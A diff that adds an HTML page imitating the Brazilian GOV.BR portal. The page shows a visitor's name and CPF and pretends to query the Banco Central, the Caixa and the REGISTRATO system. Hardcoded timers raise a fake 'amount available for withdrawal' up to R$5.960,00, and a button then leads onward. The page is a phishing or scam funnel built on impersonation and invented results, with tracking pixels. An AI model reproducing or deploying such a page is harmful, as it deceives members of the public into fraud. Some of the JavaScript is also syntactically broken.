@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type" />
+    <title>Consulta - Video - 2</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" blocking="render"></script>
+
+    <!-- fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+    <script>
+        window.googlePixelId = "68c07eb1694f08a11bcd0847";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+
+
+    <!-- REPARO DE QUERY: se a página chegar sem ?utm=..., repõe a query via sessionStorage/referrer (sem recarregar) -->
+    <script>
+        (function() {
+            try {
+                if (!location.search || location.search.length <= 1) {
+                    var saved =
+                        (sessionStorage.getItem('utm_final_qs') ||
+                            sessionStorage.getItem('landing_qs') ||
+                            (function() {
+                                try {
+                                    return new URL(document.referrer).search || ''
+                                } catch (e) {
+                                    return ''
+                                }
+                            })() ||
+                            ''
+                        ).replace(/^\?/, '');
+                    if (saved) {
+                        var cur = new URLSearchParams(location.search);
+                        var add = new URLSearchParams(saved);
+                        add.forEach(function(v, k) {
+                            if (!cur.has(k)) cur.set(k, v);
+                        });
+                        if (cur.toString()) {
+                            history.replaceState(null, '', location.pathname + '?' + cur.toString() + location.hash);
+                            console.log('[UTM] video: query reparada:', cur.toString());
+                        }
+                    }
+                }
+            } catch (e) {
+                console.warn('[UTM] video: falha ao reparar query:', e);
+            }
+        })();
+    </script>
+</head>
+
+<body class="w-full overflow-x-hidden font-[Poppins]">
+    <style>
+        @keyframes pulse-scale {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .animate-pulse-scale {
+            animation: pulse-scale 1s ease-in-out infinite;
+        }
+    </style>
+
+    <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+        <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+            <div class="px-4 py-2">
+                <div class="flex justify-between items-center">
+                    <div class="flex items-center space-x-3">
+                        <img alt="Logo GOV.BR" class="h-6 w-auto" src="./assets/img/Gov-br-logo-svg.png">
+                        <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+                        <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+                    </div>
+                    <div class="flex items-center space-x-3">
+                        <div class="flex items-center space-x-1 text-xs text-gray-500">
+                            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg>
+                            <span class="hidden sm:inline">Seguro</span>
+                        </div>
+                        <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/></svg>
+              <span class="font-medium" id="nameHeader"></span>
+            </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="h-8"></div>
+
+        <main class="px-1 py-4 md:flex md:justify-center md:items-start md:pt-8">
+            <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-4 mx-1 md:max-w-4xl w-full">
+                <div class="text-center mb-6">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-2">Consultando dados de <span id="nameUser2"></span></h1>
+                    <p class="text-gray-600">Aguarde enquanto verificamos suas informações no sistema</p>
+                    <p class="text-sm text-gray-500 mt-1">CPF: <span id="cpfUser"></span></p>
+                </div>
+
+                <div class="mb-4 sm:mb-6">
+                    <div class="relative w-full max-w-xl mx-auto">
+                        <!-- Vídeo -->
+                        <video id="video1" class="w-full rounded-md" playsinline preload="auto">
+              <source src="./assets/video/video1.mp4" type="video/mp4">
+              Seu navegador não suporta vídeo.
+            </video>
+
+                        <!-- Botão centralizado sobre o vídeo -->
+                        <div id="overlay" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-30">
+                            <button onclick="playVideo1()" class="flex flex-col items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-sm shadow-lg transition-transform hover:scale-105 animate-pulse-scale">
+                <span class="text-sm">Clique para ouvir</span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-volume-x">
+                  <path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z"/>
+                  <line x1="22" x2="16" y1="9" y2="15"/><line x1="16" x2="22" y1="9" y2="15"/>
+                </svg>
+              </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="consulta-section" class="mb-6">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+                        <p id="message" class="text-sm font-medium text-gray-800 animate-pulse">Consultando Banco Central...</p>
+                    </div>
+                </div>
+
+                <div class="text-center mb-8">
+                    <h2 class="text-lg text-gray-600 mb-2">Valor encontrado para saque:</h2>
+                    <p class="text-2xl mb-4">
+                        <span class="text-4xl font-bold">
+              <span id="valueToReceive" class="tabular-nums text-gray-600">Calculando</span>
+                        </span>
+                    </p>
+                </div>
+
+                <div id="progress-section" class="mb-8">
+                    <div class="flex justify-between text-sm text-gray-600 mb-2">
+                        <span>Progresso da consulta</span>
+                        <span>0</span>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-3">
+                        <div class="bg-blue-600 h-3 rounded-full transition-all duration-1000 ease-out" style="width: 0%;"></div>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/new/inicio/" id="buttonNext" class="relative z-30 hidden px-8 py-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-full transition-all duration-500 scale-95">
+            Continuar com o saque
+          </a>
+
+                    <div class="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg animate-fade-in hidden" id="divNext">
+                        <div class="flex items-center gap-2 mb-2">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-green-600">
+                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+              </svg>
+                            <h3 class="font-semibold text-green-800">Consulta finalizada com sucesso!</h3>
+                        </div>
+                        <p class="text-green-700 text-sm">
+                            Encontramos valores disponíveis para saque em seu CPF. Clique no botão acima para prosseguir com o processo.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            handleTimer();
+        });
+
+        const nameValue = localStorage.getItem("name") || "";
+        const formattedName = nameValue.split(" ")[0];
+        document.getElementById("nameHeader").textContent = formattedName;
+        document.getElementById('nameUser2').textContent = nameValue;
+
+        const cpfValue = localStorage.getItem('cpf') || '';
+        document.getElementById('cpfUser').textContent = cpfValue;
+
+        // --- FIX DE ÁUDIO: desmutar e tocar somente após gesto do usuário ---
+        async function playVideo1() {
+            const video = document.getElementById('video1');
+            const overlay = document.getElementById('overlay');
+            if (!video) return;
+
+            try {
+                video.muted = false;
+                video.volume = 1.0;
+                try {
+                    video.load();
+                } catch (_) {}
+                await video.play();
+                overlay ? .classList ? .add('hidden');
+            } catch (err) {
+                const unlock = async () => {
+                    try {
+                        video.muted = false;
+                        video.volume = 1.0;
+                        await video.play();
+                        overlay ? .classList ? .add('hidden');
+                        document.removeEventListener('pointerdown', unlock);
+                        document.removeEventListener('keydown', unlock);
+                    } catch (_) {}
+                };
+                document.addEventListener('pointerdown', unlock, {
+                    once: true
+                });
+                document.addEventListener('keydown', unlock, {
+                    once: true
+                });
+                console.warn('Reproduzir com áudio foi bloqueado. Aguardando próxima interação do usuário.', err);
+            }
+        }
+
+        // mensagens animadas
+        const message = document.getElementById('message');
+        setTimeout(() => {
+            message.textContent = 'Consultando Caixa Econômica...';
+        }, 10000);
+        setTimeout(() => {
+            message.textContent = 'Consultando registros bancários antigos...';
+        }, 20000);
+        setTimeout(() => {
+            message.textContent = 'Verificando histórico de pendências...';
+        }, 30000);
+        setTimeout(() => {
+            message.textContent = 'Cruzando dados CPF X Bacen...';
+        }, 40000);
+        setTimeout(() => {
+            message.textContent = 'Analisando contas inativas...';
+        }, 50000);
+        setTimeout(() => {
+            message.textContent = 'Verificando valores esquecidos...';
+        }, 60000);
+        setTimeout(() => {
+            message.textContent = 'Consultando sistema REGISTRATO...';
+        }, 70000);
+        setTimeout(() => {
+            message.textContent = 'Validando documentação...';
+        }, 80000);
+        setTimeout(() => {
+            message.textContent = 'Finalizando consulta...';
+        }, 90000);
+        setTimeout(() => {
+            message.classList.add('hidden');
+        }, 100000);
+
+        // valores dinâmicos
+        const valueToReceive = document.getElementById('valueToReceive');
+        setTimeout(() => {
+            valueToReceive.textContent = 'R$1.494,00';
+            valueToReceive.classList.replace('text-gray-600', 'text-green-600');
+        }, 10000);
+        setTimeout(() => {
+            valueToReceive.textContent = 'R$2.094,00';
+        }, 20000);
+        setTimeout(() => {
+            valueToReceive.textContent = 'R$2.394,00';
+        }, 30000);
+        setTimeout(() => {
+            valueToReceive.textContent = 'R$3.314,00';
+        }, 50000);
+        setTimeout(() => {
+            valueToReceive.textContent = 'R$4.514,00';
+        }, 70000);
+        setTimeout(() => {
+            valueToReceive.textContent = 'R$5.960,00';
+        }, 90000);
+
+        // barra de progresso
+        const progressBar = document.querySelector('#progress-section .bg-blue-600');
+        const progressText = document.querySelector('#progress-section .flex span:last-child');
+        const duration = 105000; // 105s
+        const interval = 1000;
+        const steps = duration / interval;
+        let currentStep = 0;
+        const timer = setInterval(() => {
+            currentStep++;
+            const progressPercent = Math.min((currentStep / steps) * 100, 100);
+            progressBar.style.width = `${progressPercent}%`;
+            progressText.textContent = `${Math.floor(progressPercent)}%`;
+            if (currentStep >= steps) clearInterval(timer);
+        }, interval);
+
+        // timer principal
+        function handleTimer() {
+            let totalSeconds = 105;
+            const timerElement = document.getElementById('timer');
+            const buttonElement = document.getElementById('buttonNext');
+            const divElement = document.getElementById('divNext');
+
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+                if (timerElement) {
+                    timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                }
+                totalSeconds--;
+                if (totalSeconds < 0) {
+                    clearInterval(countdown);
+                    if (timerElement) timerElement.textContent = '00:00';
+                    buttonElement ? .classList ? .remove('hidden');
+                    divElement ? .classList ? .remove('hidden');
+                }
+            }, 1000);
+        }
+
+        // timer auxiliar (permanece igual)
+        let tempoRestante = 45 * 60;
+
+        function timer2() {
+            const minutos = Math.floor(tempoRestante / 60);
+            const segundos = tempoRestante % 60;
+            const el = document.getElementById('timer2');
+            if (el) el.textContent = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
+            if (tempoRestante > 0) tempoRestante--;
+            else {
+                clearInterval(intervalo);
+                if (el) el.textContent = '00:00:00';
+            }
+        }
+        const intervalo = setInterval(timer2, 1000);
+    </script>
+
+    <!-- AJUSTE DO LINK "Continuar com o saque" PARA LEVAR OS UTM DA PÁGINA VIDEO -->
+    <script>
+        (function() {
+            try {
+                var a = document.getElementById('buttonNext');
+                if (!a) return;
+                var url = new URL(a.getAttribute('href'), location.href); // resolve /neW/inicio/
+                var cur = new URLSearchParams(location.search);
+                if ([...cur.keys()].length) {
+                    var ex = new URLSearchParams(url.search);
+                    cur.forEach(function(v, k) {
+                        if (!ex.has(k)) ex.set(k, v);
+                    });
+                    url.search = ex.toString() ? ('?' + ex.toString()) : '';
+                    a.setAttribute('href', url.pathname + url.search + url.hash);
+                    console.log('[UTM] video: link ajustado ->', a.getAttribute('href'));
+                }
+            } catch (e) {
+                console.warn('[UTM] video: falha ao ajustar link Next:', e);
+            }
+        })();
+    </script>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"839824964e1143f3811effcdab6e94ca","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
